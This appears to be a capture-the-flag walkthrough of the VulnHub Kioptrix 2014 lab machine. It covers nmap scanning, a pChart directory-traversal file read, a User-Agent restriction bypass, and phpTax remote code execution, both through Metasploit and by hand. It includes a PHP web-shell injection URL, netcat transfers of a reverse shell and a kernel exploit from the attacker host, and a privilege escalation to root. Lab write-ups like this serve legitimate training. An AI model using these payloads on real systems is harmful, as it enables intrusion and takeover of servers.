# Kioptrix2014  

**hxxps://www.vulnhub.com/entry/kioptrix-2014-5,62/**  

### NMAP  

kali@kali:~$ nmap 192.168.1.59 -p1-65535 -A  

>Starting Nmap 7.60 ( hxxps://nmap.org ) at 2018-05-04 20:34 CEST  
>Nmap scan report for kioptrix2014.home (192.168.1.59)  
>Host is up (0.00094s latency).  
>Not shown: 65532 filtered ports  
>PORT     STATE  SERVICE VERSION  
>22/tcp   closed ssh  
>80/tcp   open   hxxp    Apache hxxpd 2.2.21 ((FreeBSD) mod_ssl/2.2.21 OpenSSL/0.9.8q DAV/2 PHP/5.3.8)  
>|_hxxp-title: Site doesn't have a title (text/html).  
>8080/tcp open   hxxp    Apache hxxpd 2.2.21 ((FreeBSD) mod_ssl/2.2.21 OpenSSL/0.9.8q DAV/2 PHP/5.3.8)  
>
>Service detection performed. Please report any incorrect results at hxxps://nmap.org/submit/ .  
>Nmap done: 1 IP address (1 host up) scanned in 131.62 seconds  

### HxxP PORTS  

Port 80:  
>CONTENT="5;URL=pChart2.1.3/index.php  

Port 8080:  
>403 Forbidden  

### PORT 80  

After so much try harding, I start looking for known vulnerabilities...  
(I should've started there... T.T')  

*https://www.exploit-db.com/exploits/31173/*  

There's a XSS and LFI. Not much to do with the XSS so:  

hxxp://192.168.1.59/pChart2.1.3/examples/index.php?Action=View&Script=%2f..%2f..%2fetc/passwd  

>\# $FreeBSD: release/9.0.0/etc/master.passwd 218047 2011-01-28 22:29:38Z pjd $  
>\#  
>root:*:0:0:Charlie &:/root:/bin/csh  
>toor:*:0:0:Bourne-again Superuser:/root:  
>daemon:*:1:1:Owner of many system processes:/root:/usr/sbin/nologin  
>operator:*:2:5:System &:/:/usr/sbin/nologin  
>bin:*:3:7:Binaries Commands and Source:/:/usr/sbin/nologin  
>tty:*:4:65533:Tty Sandbox:/:/usr/sbin/nologin  
>kmem:*:5:65533:KMem Sandbox:/:/usr/sbin/nologin  
>games:*:7:13:Games pseudo-user:/usr/games:/usr/sbin/nologin  
>news:*:8:8:News Subsystem:/:/usr/sbin/nologin  
>man:*:9:9:Mister Man Pages:/usr/share/man:/usr/sbin/nologin  
>sshd:*:22:22:Secure Shell Daemon:/var/empty:/usr/sbin/nologin  
>smmsp:*:25:25:Sendmail Submission User:/var/spool/clientmqueue:/usr/sbin/nologin  
>mailnull:*:26:26:Sendmail Default User:/var/spool/mqueue:/usr/sbin/nologin  
>bind:*:53:53:Bind Sandbox:/:/usr/sbin/nologin  
>proxy:*:62:62:Packet Filter pseudo-user:/nonexistent:/usr/sbin/nologin  
>_pflogd:*:64:64:pflogd privsep user:/var/empty:/usr/sbin/nologin  
>_dhcp:*:65:65:dhcp programs:/var/empty:/usr/sbin/nologin  
>uucp:*:66:66:UUCP pseudo-user:/var/spool/uucppublic:/usr/local/libexec/uucp/uucico  
>pop:*:68:6:Post Office Owner:/nonexistent:/usr/sbin/nologin  
>www:*:80:80:World Wide Web Owner:/nonexistent:/usr/sbin/nologin  
>hast:*:845:845:HAST unprivileged user:/var/empty:/usr/sbin/nologin  
>nobody:*:65534:65534:Unprivileged user:/nonexistent:/usr/sbin/nologin  
>mysql:*:88:88:MySQL Daemon:/var/db/mysql:/usr/sbin/nologin  
>ossec:*:1001:1001:User &:/usr/local/ossec-hids:/sbin/nologin  
>ossecm:*:1002:1001:User &:/usr/local/ossec-hids:/sbin/nologin  
>ossecr:*:1003:1001:User &:/usr/local/ossec-hids:/sbin/nologin  

Now we need to know why we can't access the 8080 port. After loosing too much time in the /var/www/ folder, I noticed that it is a FreeBSD and looked for an answer:  
*https://www.freebsd.org/doc/handbook/network-apache.html*  
Yes, Quick Note for the future: Don't go blindly and look for information! The actual config file was in another path, so let's move on:  

hxxp://192.168.1.59/pChart2.1.3/examples/index.php?Action=View&Script=%2f..%2f..%2fusr/local/etc/apache22/hxxpd.conf  

>*SetEnvIf User-Agent ^Mozilla/4.0 Mozilla4_browser*  
>
><VirtualHost *:8080>
>  	    DocumentRoot /usr/local/www/apache22/data2
>
><Directory "/usr/local/www/apache22/data2">
>  	    Options Indexes FollowSymLinks
>          AllowOverride All
>          Order allow,deny
>          *Allow from env=Mozilla4_browser*
></Directory>

Nice try.  

>kali@kali:~$ curl hxxp://192.168.1.59:8080 -H 'User-Agent: Mozilla/4.0' -v  
>\* Rebuilt URL to: hxxp://192.168.1.59:8080/  
>\*   Trying 192.168.1.59...  
>\* TCP_NODELAY set  
>\* Connected to 192.168.1.59 (192.168.1.59) port 8080 (#0)  
>\> GET / HxxP/1.1  
>\> Host: 192.168.1.59:8080  
>\> Accept: */*  
>\> User-Agent: Mozilla/4.0  
>\>   
>< HxxP/1.1 200 OK  
>< Date: Sat, 05 May 2018 01:30:33 GMT  
>< Server: Apache/2.2.21 (FreeBSD) mod_ssl/2.2.21 OpenSSL/0.9.8q DAV/2 PHP/5.3.8  
>< Content-Length: 201  
>< Content-Type: text/html;charset=ISO-8859-1  
><   
>\<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 3.2 Final//EN">  
>\<html>  
> \<head>
>    \<title>Index of /</title>
>    \</head>
>    \<body>
>   	\<h1>Index of /</h1>
>   	\<ul><li><a href="phptax/"> phptax/</a></li>
>  	\</ul>  
>  \</body></html>  
> \* Connection #0 to host 192.168.1.59 left intact  

We know now what are we facing. Phptax. Now I won't make the same mistake. First, look for info.  
*https://www.exploit-db.com/exploits/21665/*  
*https://www.exploit-db.com/exploits/25849/*  
*https://www.exploit-db.com/exploits/21833/*  

Yes, straight forward.  

### METASPLOIT  

msf > use exploit/multi/hxxp/phptax_exec  
msf exploit(multi/hxxp/phptax_exec) > show options  
msf exploit(multi/hxxp/phptax_exec) > set rhost 192.168.1.59  
>rhost => 192.168.1.59  
msf exploit(multi/hxxp/phptax_exec) > set rport 8080  
>rport => 8080  
msf exploit(multi/hxxp/phptax_exec) > run  
>[\*] Started reverse TCP double handler on 192.168.1.115:4444   
>[\*] 192.168.1.598080 - Sending request...  
>[\*] Accepted the first client connection...  
>[\*] Accepted the second client connection...  
>[\*] Accepted the first client connection...  
>[\*] Accepted the second client connection...  
>[\*] Command: echo Dyn6WNrvO5arqqAi;  
>[\*] Writing to socket A  
>[\*] Writing to socket B  
>[\*] Reading from sockets...  
>[\*] Command: echo vONiXrkbhARLjybU;  
>[\*] Writing to socket A  
>[\*] Writing to socket B  
>[\*] Reading from sockets...  
>[\*] Reading from socket B  
>[\*] B: "Dyn6WNrvO5arqqAi\r\n"  
>[\*] Matching...  
>[\*] A is input...  
>[\*] Reading from socket B  
>[\*] B: "vONiXrkbhARLjybU\r\n"  
>[\*] Matching...  
>[\*] A is input...  
>[\*] Command shell session 1 opened (192.168.1.115:4444 -> 192.168.1.59:28567) at 2018-05-05 09:41:42 +0200  
>[\*] Command shell session 2 opened (192.168.1.115:4444 -> 192.168.1.59:63427) at 2018-05-05 09:41:42 +0200  
>
>id  
>uid=80(www) gid=80(www) groups=80(www)  
>uname -a  
>FreeBSD kioptrix2014 9.0-RELEASE FreeBSD 9.0-RELEASE #0: Tue Jan  3 07:46:30 UTC 2012     root@farrell.cse.buffalo.edu:/usr/obj/usr/src/sys/GENERIC  amd64  
>wget https://www.exploit-db.com/download/26368.c  
>wget: not found  
>curl https://www.exploit-db.com/download/26368.c -o exploit.c  
>curl: not found  

Without curl and wget, we have to do another step.  
Download it from our computer:  

kali@kali:~$ wget hxxps://www.exploit-db.com/download/26368.c  

And transfer it via nc  

kali@kali:~$ nc -nlvp 4445 < 26368.c  

>nc 192.168.1.115 4445 > 26368.c  
>ls  
>26368.c  
>gcc 26368.c -o 26368  
>./26368  
>id  
>uid=0(root) gid=0(wheel) egid=80(www) groups=80(www)  
>cat /root/congrats.txt  

### WITHOUT METASPLOIT  

That was easy, so let's try without the actual exploit.  
*https://www.exploit-db.com/exploits/25849/*  
We picked up this post, read the exploit and replicate the steps manually:  

First request:  

hxxp://192.168.1.59:8080/phptax/index.php?field=rce.php&newvalue=%3C%3Fphp%20passthru%28%24_GET[cmd]%29%3B%3F%3E  

And we got our non-interactive shell.  

hxxp://192.168.1.59:8080/phptax/data/rce.php?cmd=id  
>uid=80(www) gid=80(www) groups=80(www)   

Let's spawn an actual shell. We run the apache and place a reverse shell to pick it up from the server:  

hxxp://192.168.1.59:8080/phptax/data/rce.php?cmd=wget%20192.168.1.115/php-shell-reverse.php  

Oh, I forgot, there was no wget. So, same way, with our friend nc:  

hxxp://192.168.1.59:8080/phptax/data/rce.php?cmd=nc%20192.168.1.115%204445%20%3E%20reverse.php  

kali@kali:~$ nc -nlvp 4445 < php-reverse-shell.php   
>listening on [any] 4445 ...  
>connect to [192.168.1.115] from (UNKNOWN) [192.168.1.59] 39536  

  
hxxp://192.168.1.59:8080/phptax/data/reverse.php  

kali@kali:~$ nc -nlvp 4444  
>listening on [any] 4444 ...  
>connect to [192.168.1.115] from (UNKNOWN) [192.168.1.59] 44438  
>FreeBSD kioptrix2014 9.0-RELEASE FreeBSD 9.0-RELEASE #0: Tue Jan  3 07:46:30 UTC 2012     root@farrell.cse.buffalo.edu:/usr/obj/usr/src/sys/GENERIC  amd64  
>10:31AM  up 14:01, 0 users, load averages: 0.03, 0.04, 0.00  
>USER       TTY      FROM                      LOGIN@  IDLE WHAT  
>uid=80(www) gid=80(www) groups=80(www)  
>sh: can't access tty; job control turned off  
>$ id  
>uid=80(www) gid=80(www) groups=80(www)  

Now we have an interactive shell.  